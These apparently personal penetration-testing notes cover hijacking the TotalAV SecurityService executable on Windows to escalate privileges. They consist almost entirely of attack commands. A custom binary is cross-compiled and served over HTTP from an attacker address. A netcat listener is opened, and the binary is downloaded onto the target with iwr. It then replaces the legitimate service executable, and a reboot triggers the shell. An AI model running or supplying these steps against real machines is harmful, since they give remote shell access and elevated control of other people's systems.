## compile
```
x86_64-w64-mingw32-gcc SecurityService.c -o SecurityService.exe
```

turn on python server at port 80 

as well

```
nc -lvnp 5432
```

transfer to target
```
iwr -uri http://192.168.xxx.xxx/SecurityService.exe -outfile SecurityService.exe
```

now setps
```
mv "C:\Program Files (x86)\TotalAV\SecurityService.exe" ./SecurityService.exe.old
mv ./SecurityService.exe "C:\Program Files (x86)\TotalAV\SecurityService.exe"
shutdown /r /t 0
```

you hit shell after 2-10 sec
